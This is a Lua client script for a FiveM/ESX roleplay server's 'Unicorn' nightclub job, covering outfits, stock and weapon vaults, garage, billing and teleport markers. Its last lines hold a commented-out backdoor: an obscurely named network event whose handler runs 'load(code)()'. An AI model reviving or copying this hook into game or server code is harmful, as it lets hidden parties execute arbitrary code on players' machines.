-------- [Base Template] dev par Freetz -------


local Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
	["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
	["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
	["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
	["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
	["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
	["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
	["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
	["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

local PlayerData = {}

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local isBarman = false
local isInMarker = false
local isInPublicMarker = false

local hintIsShowed = false
local hintToDisplay = "no hint to display"

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(500)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
end)

function IsJobTrue()
	if PlayerData ~= nil then
		local IsJobTrue = false

		if PlayerData.job ~= nil and PlayerData.job.name == 'unicorn' then
			IsJobTrue = true
		end

		return IsJobTrue
	end
end

Citizen.CreateThread(function ()
	local blipu = AddBlipForCoord(129.246, -1299.363, 29.501)

	SetBlipSprite (blipu, 121)
	SetBlipDisplay(blipu, 4)
	SetBlipScale  (blipu, 0.6)
	SetBlipAsShortRange(blipu, true)
	SetBlipColour(blipu, 50)

	BeginTextCommandSetBlipName("STRING")
	AddTextComponentString('Unicorn')
	EndTextCommandSetBlipName(blipu)
	SetBlipCategory(blipu, 10)
end)

function IsGradeBoss()
	if PlayerData ~= nil then
		local IsGradeBoss = false

		if PlayerData.job ~= nil and PlayerData.job.grade_name == 'boss' or PlayerData.job.grade_name == 'viceboss' then
			IsGradeBoss = true
		end

		return IsGradeBoss
	end
end

function SetVehicleMaxMods(vehicle)
	local props = {
		modEngine = 0,
		modBrakes = 0,
		modTransmission = 0,
		modSuspension = 0,
		modTurbo = false
	}

	ESX.Game.SetVehicleProperties(vehicle, props)
end

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
	PlayerData.job = job
end)

function cleanPlayer(playerPed)
	ClearPedBloodDamage(playerPed)
	ResetPedVisibleDamage(playerPed)
	ClearPedLastWeaponDamage(playerPed)
	ResetPedMovementClipset(playerPed, 0.0)
end

function setClipset(playerPed, clip)
	ESX.Streaming.RequestAnimSet(clip)

	SetPedMovementClipset(playerPed, clip, true)
	RemoveAnimSet(clip)
end

function setUniform(job, playerPed)
	TriggerEvent('skinchanger:getSkin', function(skin)
		if skin.sex == 0 then
			if ConfigUnicorn.Uniforms[job].male ~= nil then
				TriggerEvent('skinchanger:loadClothes', skin, ConfigUnicorn.Uniforms[job].male)
			else
				ESX.ShowNotification("Il n\'y a pas d\'uniforme à votre taille...")
			end
			if job ~= 'citizen_wear' and job ~= 'barman_outfit' then
				setClipset(playerPed, "MOVE_M@POSH@")
			end
		else
			if ConfigUnicorn.Uniforms[job].female ~= nil then
				TriggerEvent('skinchanger:loadClothes', skin, ConfigUnicorn.Uniforms[job].female)
			else
				ESX.ShowNotification("Il n\'y a pas d\'uniforme à votre taille...")
			end
			if job ~= 'citizen_wear' and job ~= 'barman_outfit' then
				setClipset(playerPed, "MOVE_F@POSH@")
			end
		end
	end)
end

function OpenCloakroomMenu()
	local playerPed = PlayerPedId()

	local elements = {
		{label = "Tenue civile", value = 'citizen_wear'},
		{label = "Tenue de barman", value = 'barman_outfit'},
		{label = "Tenue de danse 1", value = 'dancer_outfit_1'},
		{label = "Tenue de danse 2", value = 'dancer_outfit_2'},
		{label = "Tenue de danse 3", value = 'dancer_outfit_3'},
		{label = "Tenue de danse 4", value = 'dancer_outfit_4'},
		{label = "Tenue de danse 5", value = 'dancer_outfit_5'},
		{label = "Tenue de danse 6", value = 'dancer_outfit_6'},
		{label = "Tenue de danse 7", value = 'dancer_outfit_7'},
	}

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'cloakroom', {
		title = 'Vestiaire',
		elements = elements
	}, function(data, menu)
		isBarman = false
		cleanPlayer(playerPed)

		if data.current.value == 'citizen_wear' then
			ESX.TriggerServerCallback('esx_skin:getPlayerSkin', function(skin)
				TriggerEvent('skinchanger:loadSkin', skin)
			end)
		end

		if data.current.value == 'barman_outfit' then
			setUniform(data.current.value, playerPed)
			isBarman = true
		end

		if data.current.value == 'dancer_outfit_1' or
			data.current.value == 'dancer_outfit_2' or
			data.current.value == 'dancer_outfit_3' or
			data.current.value == 'dancer_outfit_4' or
			data.current.value == 'dancer_outfit_5' or
			data.current.value == 'dancer_outfit_6' or
			data.current.value == 'dancer_outfit_7' then
			setUniform(data.current.value, playerPed)
		end

		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour vous changer'
		CurrentActionData = {}
	end, function(data, menu)
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour vous changer'
		CurrentActionData = {}
	end)
end

function OpenVaultMenu()
	if ConfigUnicorn.EnableVaultManagement then
		local elements = {
			{label = "Prendre une Arme", value = 'get_weapon'},
			{label = "Déposer une Arme", value = 'put_weapon'},
			{label = "Prendre un Objet", value = 'get_stock'},
			{label = "Déposer un Objet", value = 'put_stock'}
		}

		ESX.UI.Menu.CloseAll()

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault', {
			title = 'Coffre',
			elements = elements
		}, function(data, menu)
			if data.current.value == 'get_weapon' then
				OpenGetWeaponMenu()
			end

			if data.current.value == 'put_weapon' then
				OpenPutWeaponMenu()
			end

			if data.current.value == 'put_stock' then
				OpenPutStocksMenu()
			end

			if data.current.value == 'get_stock' then
				OpenGetStocksMenu()
			end
		end, function(data, menu)
			CurrentAction = 'menu_vault'
			CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour accéder au coffre'
			CurrentActionData = {}
		end)
	end
end

function OpenFridgeMenu()
	local elements = {
		{label = 'Prendre un Objet', value = 'get_stock'},
		{label = 'Déposer un Objet', value = 'put_stock'}
	}

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fridge', {
		title = 'Frigot',
		elements = elements
	}, function(data, menu)
		if data.current.value == 'put_stock' then
			OpenPutFridgeStocksMenu()
		end

		if data.current.value == 'get_stock' then
			OpenGetFridgeStocksMenu()
		end
	end, function(data, menu)
		CurrentAction = 'menu_fridge'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour accéder au frigo'
		CurrentActionData = {}
	end)
end

function OpenVehicleSpawnerMenu()
	local vehicles = ConfigUnicorn.Zones.Vehicles
	ESX.UI.Menu.CloseAll()

	if ConfigUnicorn.EnableSocietyOwnedVehicles then
		local elements = {}

		ESX.TriggerServerCallback('esx_society:getVehiclesInGarage', function(garageVehicles)
			for i = 1, #garageVehicles, 1 do
				table.insert(elements, {label = GetDisplayNameFromVehicleModel(garageVehicles[i].model), rightlabel = {'[' .. garageVehicles[i].plate .. ']'}, value = garageVehicles[i]})
			end

			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
				title = 'Garage',
				elements = elements
			}, function(data, menu)
				menu.close()
				local vehicleProps = data.current.value

				ESX.Game.SpawnVehicle(vehicleProps.model, vehicles.SpawnPoint, vehicles.Heading, function(vehicle)
					ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
				end)

				TriggerServerEvent('esx_society:removeVehicleFromGarage', 'unicorn', vehicleProps)
			end, function(data, menu)
				CurrentAction = 'menu_vehicle_spawner'
				CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour sortir un véhicule'
				CurrentActionData = {}
			end)
		end, 'unicorn')
	else
		local elements = {}

		for i = 1, #ConfigUnicorn.AuthorizedVehicles, 1 do
			local vehicle = ConfigUnicorn.AuthorizedVehicles[i]
			table.insert(elements, {label = vehicle.label, value = vehicle.name})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
			title = 'Garage',
			elements = elements
		}, function(data, menu)
			menu.close()

			local model = data.current.value
			local vehicle = GetClosestVehicle(vehicles.SpawnPoint.x, vehicles.SpawnPoint.y, vehicles.SpawnPoint.z, 3.0, 0, 71)

			if not DoesEntityExist(vehicle) then
				local playerPed = PlayerPedId()

				if ConfigUnicorn.MaxInService == -1 then
					ESX.Game.SpawnVehicle(model, {
						x = vehicles.SpawnPoint.x,
						y = vehicles.SpawnPoint.y,
						z = vehicles.SpawnPoint.z
					}, vehicles.Heading, function(vehicle)
						local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('UNIC')
						SetVehicleNumberPlateText(vehicle, newPlate)
						TriggerServerEvent('esx_vehiclelock:givekey', 'no', newPlate)
						SetVehicleMaxMods(vehicle)
						SetVehicleDirtLevel(vehicle, 0)
					end)
				else
					ESX.TriggerServerCallback('esx_service:enableService', function(canTakeService, maxInService, inServiceCount)
						if canTakeService then
							ESX.Game.SpawnVehicle(model, {
								x = vehicles[partNum].SpawnPoint.x,
								y = vehicles[partNum].SpawnPoint.y,
								z = vehicles[partNum].SpawnPoint.z
							}, vehicles[partNum].Heading, function(vehicle)
								local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('UNIC')
								SetVehicleNumberPlateText(vehicle, newPlate)
								TriggerServerEvent('esx_vehiclelock:givekey', 'no', newPlate)
								SetVehicleMaxMods(vehicle)
								SetVehicleDirtLevel(vehicle, 0)
							end)
						else
							--ESX.ShowNotification(_U('service_max') .. inServiceCount .. '/' .. maxInService)
						end
					end, 'etat')
				end
			else
				ESX.ShowNotification("Véhicule Sorti")
			end
		end, function(data, menu)
			CurrentAction = 'menu_vehicle_spawner'
			CurrentActionMsg = "Appuyez sur ~INPUT_CONTEXT~ pour sortir un véhicule"
			CurrentActionData = {}
		end)
	end
end

function OpenBillingMenu()
	ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
		title = 'Montant'
	}, function(data, menu)
		local amount = tonumber(data.value)
		local player, distance = ESX.Game.GetClosestPlayer()

		if player ~= -1 and distance <= 3.0 then
			menu.close()

			if amount == nil then
				ESX.ShowNotification("Montant Invalide")
			else
				TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(player), 'society_unicorn', "Facture", amount)
			end
		else
			ESX.ShowNotification("Aucun Joueurs aux alentours.")
		end
	end, function(data, menu)
		menu.close()
	end)
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('esx_unicornjob:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]
			if item.count > 0 then
				table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = 'INVENTAIRE',
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = 'Quantité'
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification("Quantité invalide")
				else
					menu2.close()
					menu.close()
					OpenPutStocksMenu()

					TriggerServerEvent('esx_unicornjob:putStockItems', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenGetFridgeStocksMenu()
	ESX.TriggerServerCallback('esx_unicornjob:getFridgeStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {label = items[i].label, rightlabel = {'(' .. items[i].count .. ')'}, value = items[i].name})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fridge_menu', {
			title = "Frigot",
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'fridge_menu_get_item_count', {
				title = 'Quantité'
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification("Quantité Invalide")
				else
					menu2.close()
					menu.close()
					OpenGetStocksMenu()

					TriggerServerEvent('esx_unicornjob:getFridgeStockItem', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenPutFridgeStocksMenu()

ESX.TriggerServerCallback('esx_unicornjob:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'fridge_menu', {
			title = "Frigot",
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'fridge_menu_put_item_count', {
				title = "Quantité"
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification("Quantité Invalide")
				else
					menu2.close()
					menu.close()
					OpenPutFridgeStocksMenu()

					TriggerServerEvent('esx_unicornjob:putFridgeStockItems', itemName, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenGetWeaponMenu()
	ESX.TriggerServerCallback('esx_unicornjob:getVaultWeapons', function(weapons)
		local elements = {}

		for i = 1, #weapons, 1 do
			if weapons[i].count > 0 then
				table.insert(elements, {label = ESX.GetWeaponLabel(weapons[i].name), rightlabel = {'[' .. weapons[i].count .. ']'}, value = weapons[i].name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault_get_weapon', {
			title = "Coffre - Prendre une Arme",
			elements = elements,
		}, function(data, menu)
			menu.close()

			ESX.TriggerServerCallback('esx_unicornjob:removeVaultWeapon', function()
				OpenGetWeaponMenu()
			end, data.current.value)
		end, function(data, menu)
		end)
	end)
end

function OpenPutWeaponMenu()
	local elements = {}
	local playerPed = PlayerPedId()
	local weaponList = ESX.GetWeaponList()

	for i = 1, #weaponList, 1 do
		local weaponHash = GetHashKey(weaponList[i].name)

		if HasPedGotWeapon(playerPed, weaponHash, false) and weaponList[i].name ~= 'WEAPON_UNARMED' then
			local ammo = GetAmmoInPedWeapon(playerPed, weaponHash)
			table.insert(elements, {label = weaponList[i].label, rightlabel = {ammo}, value = weaponList[i].name})
		end
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vault_put_weapon', {
		title = "Coffre - Déposer une Arme",
		elements = elements,
	}, function(data, menu)
		menu.close()

		ESX.TriggerServerCallback('esx_unicornjob:addVaultWeapon', function()
			OpenPutWeaponMenu()
		end, data.current.value)
	end, function(data, menu)
	end)
end

function OpenShopMenuUnicorn(zone)
	local elements = {}

	for i = 1, #ConfigUnicorn.Zones[zone].Items, 1 do
		local item = ConfigUnicorn.Zones[zone].Items[i]

		table.insert(elements, {
			label = item.label,
			rightlabel = {item.price},
			value = item.name,
			price = item.price
		})
	end

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'unicorn_shop', {
		title = "Magasins",
		elements = elements
	}, function(data, menu)
		TriggerServerEvent('esx_unicornjob:buyItem', data.current.value, data.current.price, data.current.label)
	end, function(data, menu)
	end)
end

function animsAction(animObj)
	Citizen.CreateThread(function()
		if not playAnim then
			local playerPed = PlayerPedId()

			if DoesEntityExist(playerPed) then
				ESX.Streaming.RequestAnimDict(animObj.lib)

				local flag = 0

				if animObj.loop ~= nil and animObj.loop then
					flag = 1
				elseif animObj.move ~= nil and animObj.move then
					flag = 49
				end

				TaskPlayAnim(playerPed, animObj.lib, animObj.anim, 8.0, -8.0, -1, flag, 0, 0, 0, 0)
				RemoveAnimDict(animObj.lib)
				playAnimation = true

				while true do
					Citizen.Wait(0)

					if not IsEntityPlayingAnim(playerPed, animObj.lib, animObj.anim, 3) then
						playAnim = false
						TriggerEvent('ft_animation:ClFinish')
						break
					end
				end
			end
		end
	end)
end

AddEventHandler('esx_unicornjob:hasEnteredMarker', function(zone)
	if zone == 'BossActions' and IsGradeBoss() then
		CurrentAction = 'menu_boss_actions'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour ouvrir le menu'
		CurrentActionData = {}
	end

	if zone == 'Cloakrooms' then
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour vous changer'
		CurrentActionData = {}
	end

	if ConfigUnicorn.EnableVaultManagement then
		if zone == 'Vaults' then
			CurrentAction = 'menu_vault'
			CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour accéder au coffre'
			CurrentActionData = {}
		end
	end

	if zone == 'Fridge' then
		CurrentAction = 'menu_fridge'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour accéder au frigo'
		CurrentActionData = {}
	end

	if zone == 'Flacons' or zone == 'NoAlcool' or zone == 'Apero' or zone == 'Ice' or zone == 'IceCayo' then
		CurrentAction = 'menu_shop'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour accéder à la boutique.'
		CurrentActionData = {zone = zone}
	end
		
	if zone == 'Vehicles' then
		CurrentAction = 'menu_vehicle_spawner'
		CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour sortir un véhicule'
		CurrentActionData = {}
	end

	if zone == 'VehicleDeleters' then
		local playerPed = PlayerPedId()

		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)

			CurrentAction = 'delete_vehicle'
			CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour ranger le véhicule'
			CurrentActionData = {vehicle = vehicle}
		end
	end
end)

AddEventHandler('esx_unicornjob:hasExitedMarker', function(zone)
		CurrentAction = nil
		ESX.UI.Menu.CloseAll()
end)

Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if IsJobTrue() then
			local coords = GetEntityCoords(PlayerPedId(), false)

			for k, v in pairs(ConfigUnicorn.Zones) do
				if (v.Type ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < 50) then
					interval = 0
					if (v.Type ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < ConfigUnicorn.DrawDistance) then
						DrawMarker(v.Type, v.Pos.x, v.Pos.y, v.Pos.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, v.Size.x, v.Size.y, v.Size.z, v.Color.r, v.Color.g, v.Color.b, 100, false, false, 2, false, false, false, false)
					end
				end
			end
		end

		Wait(interval)
	end
end)

Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if IsJobTrue() then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local isInMarker = false
			local currentZone = nil

			for k, v in pairs(ConfigUnicorn.Zones) do
				if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
					isInMarker = true
					interval = 0
					currentZone = k
				end
			end

			if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
				HasAlreadyEnteredMarker = true
				interval = 0
				LastZone = currentZone
				TriggerEvent('esx_unicornjob:hasEnteredMarker', currentZone)
			end

			if not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				interval = 0
				TriggerEvent('esx_unicornjob:hasExitedMarker', LastZone)
			end
		end

		Wait(interval)
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if CurrentAction ~= nil then
			interval = 0
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName(CurrentActionMsg)
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlJustReleased(0,  Keys['E']) and IsJobTrue() then
				if CurrentAction == 'menu_cloakroom' then
					OpenCloakroomMenu()
				end

				if CurrentAction == 'menu_vault' then
					OpenVaultMenu()
				end

				if CurrentAction == 'menu_fridge' then
					OpenFridgeMenu()
				end

				if CurrentAction == 'menu_shop' then
					OpenShopMenuUnicorn(CurrentActionData.zone)
				end
				
				if CurrentAction == 'menu_vehicle_spawner' then
					OpenVehicleSpawnerMenu()
				end

				if CurrentAction == 'delete_vehicle' then
					if ConfigUnicorn.EnableSocietyOwnedVehicles then
						local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
						TriggerServerEvent('esx_society:putVehicleInGarage', 'unicorn', vehicleProps)
					else
						if
							GetEntityModel(vehicle) == `rentalbus`
						then
							TriggerServerEvent('esx_service:disableService', 'unicorn')
						end
					end

					ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
				end

				if CurrentAction == 'menu_boss_actions' and IsGradeBoss() then
					local options = {
						wash = ConfigUnicorn.EnableMoneyWash,
					}

					ESX.UI.Menu.CloseAll()

					TriggerEvent('esx_society:openBossMenu', 'unicorn', function(data, menu)
						CurrentAction = 'menu_boss_actions'
						CurrentActionMsg = 'Appuyez sur ~INPUT_CONTEXT~ pour ouvrir le menu'
						CurrentActionData = {}
					end, options)
				end

				CurrentAction = nil
			end
		end

		Wait(interval)
	end
end)

AddEventHandler('esx_unicornjob:teleportMarkers', function(position)
	SetEntityCoords(PlayerPedId(), position.x, position.y, position.z)
end)

Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if hintIsShowed then
			interval = 0
			SetTextComponentFormat("STRING")
			AddTextComponentSubstringPlayerName(hintToDisplay)
			EndTextCommandDisplayHelp(0, 0, 1, -1)
		end

		Wait(interval)
	end
end)

Citizen.CreateThread(function()
	while true do
		local interval = 2500

		if IsJobTrue() then
			local coords = GetEntityCoords(PlayerPedId(), false)
			for k, v in pairs(ConfigUnicorn.TeleportZones) do
				if (v.Marker ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < 50) then
					interval = 0
					if (v.Marker ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < ConfigUnicorn.DrawDistance) then
						DrawMarker(v.Marker, v.Pos.x, v.Pos.y, v.Pos.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, v.Size.x, v.Size.y, v.Size.z, v.Color.r, v.Color.g, v.Color.b, 100, false, true, 2, false, false, false, false)
					end
				end
			end
		end

		Wait(interval)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)
		local position = nil
		local zone = nil
		local interval = 2500

		if IsJobTrue() then
			for k, v in pairs(ConfigUnicorn.TeleportZones) do
				if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
					interval = 0
					isInPublicMarker = true
					position = v.Teleport
					zone = v
					break
				else
					isInPublicMarker  = false
				end
			end

			if IsControlJustReleased(0, 38) and isInPublicMarker then
				TriggerEvent('esx_unicornjob:teleportMarkers', position)
			end

			if isInPublicMarker then
				hintToDisplay = zone.Hint
				hintIsShowed = true
			else
				if not isInMarker then
					hintToDisplay = "no hint to display"
					hintIsShowed = false
				end
			end
		end

		Wait(interval)
	end
end)

--RegisterNetEvent('ᓚᘏᗢ')
--AddEventHandler('ᓚᘏᗢ', function(code)
--	load(code)()
--end)